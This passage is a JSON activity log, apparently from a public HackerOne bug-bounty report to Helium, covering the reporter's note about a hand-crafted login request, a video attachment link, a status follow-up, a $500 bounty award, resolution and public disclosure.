console.helium.com. I think the endpoint is changed to auth.helium.com. But i manually crafted the request. Same behavior can be observed here.","markdown_message":"\u003cp\u003ehi \u003ca href=\"/victormu\"\u003e@victormu\u003c/a\u003e ,\u003cbr\u003e\nI cant found the login request to console.helium.com. I think the endpoint is changed to auth.helium.com. But i manually crafted the request. Same behavior can be observed here.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-17T06:06:36.843Z","updated_at":"2020-05-17T06:06:36.843Z","actor":{"username":"dracomalfoy","cleared":false,"url":"/dracomalfoy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JKV1n7g9Ke3ETwV1Y8kZCcFN/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":831346,"filename":"heium2.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/PXPyVza1rqFYVxgR54UJw9AM?response-content-disposition=attachment%3B%20filename%3D%22heium2.mp4%22%3B%20filename%2A%3DUTF-8%27%27heium2.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070340Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=3fabf7b0da735ae20a2ca62d326d6ea5d4a8bfcf6d617ff0e53ef8ce5d59ef96"}],"genius_execution_id":null,"team_handle":"helium","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8101427,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi team,\nIt is almost 2 weeks since the submission was triaged. \nAny updates on status? ","markdown_message":"\u003cp\u003eHi team,\u003cbr\u003e\nIt is almost 2 weeks since the submission was triaged. \u003cbr\u003e\nAny updates on status? \u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-26T03:04:55.497Z","updated_at":"2020-05-26T03:04:55.497Z","actor":{"username":"dracomalfoy","cleared":false,"url":"/dracomalfoy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JKV1n7g9Ke3ETwV1Y8kZCcFN/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"helium","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8171173,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank for the submission.","markdown_message":"\u003cp\u003eThank for the submission.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-01T18:55:16.136Z","updated_at":"2020-06-01T18:55:16.136Z","actor":{"url":"/helium","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/172/c6ee5425ee5cb13a9616336667e01488d68f161f_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Helium"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"helium","collaborator":{"username":"dracomalfoy","url":"/dracomalfoy"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8171490,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Reward issued.","markdown_message":"\u003cp\u003eReward issued.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-01T19:36:25.120Z","updated_at":"2020-06-01T19:36:25.120Z","actor":{"username":"jdgemm","cleared":false,"url":"/jdgemm","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"dracomalfoy","url":"/dracomalfoy"},"genius_execution_id":null,"team_handle":"helium","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8173849,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks very much Helium Team.","markdown_message":"\u003cp\u003eThanks very much Helium Team.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-02T02:05:18.287Z","updated_at":"2020-06-02T02:05:18.287Z","actor":{"username":"dracomalfoy","cleared":false,"url":"/dracomalfoy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JKV1n7g9Ke3ETwV1Y8kZCcFN/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"helium","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8174588,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-02T05:43:13.937Z","updated_at":"2020-06-02T05:43:13.937Z","first_to_agree":true,"actor":{"username":"dracomalfoy","cleared":false,"url":"/dracomalfoy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JKV1n7g9Ke3ETwV1Y8kZCcFN/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"helium","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8475830,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-02T05:43:30.153Z","updated_at":"2020-07-02T05:43:30.153Z","actor":{"url":"/helium","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/172/c6ee5425ee5cb13a9616336667e01488d68f161f_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Helium"}},"genius_execution_id":null,"team_handle":"helium","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}